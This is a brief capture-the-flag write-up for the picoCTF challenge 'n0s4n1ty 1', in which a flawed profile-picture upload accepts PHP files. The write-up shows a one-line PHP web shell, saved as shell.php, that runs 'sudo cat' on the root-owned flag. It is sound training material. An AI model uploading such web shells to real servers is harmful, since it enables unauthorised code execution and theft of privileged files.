# n0s4n1ty 1

[Challenge](https://play.picoctf.org/practice/challenge/482?category=1&originalEvent=74&page=1)

Author: Prince Niyonshuti N.

Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.

Additional details will be available after launching your challenge instance.

---

<img width="1104" alt="Screenshot 2025-05-03 at 3 51 50 PM" src="https://github.com/user-attachments/assets/4316b3b9-4189-436e-b6f9-4d72b4d54ce2" />

There's some file upload thing........

<img width="1039" alt="Screenshot 2025-05-03 at 3 52 03 PM" src="https://github.com/user-attachments/assets/1f62d0cd-eebf-4733-ad53-3d7fdf3a4965" />

It takes .php file.

so we know flag is located at /root.

```<?php echo exec("sudo cat /root/flag.txt");?>``` save this as shell.php and upload it.

<img width="1023" alt="Screenshot 2025-05-03 at 3 54 57 PM" src="https://github.com/user-attachments/assets/85296d4a-c38e-469a-a407-49926e3e8ce2" />

---

<img width="1043" alt="Screenshot 2025-05-03 at 3 55 10 PM" src="https://github.com/user-attachments/assets/bd605c9d-5f5c-4cd5-a3f2-f8c62dc10ddd" />


---
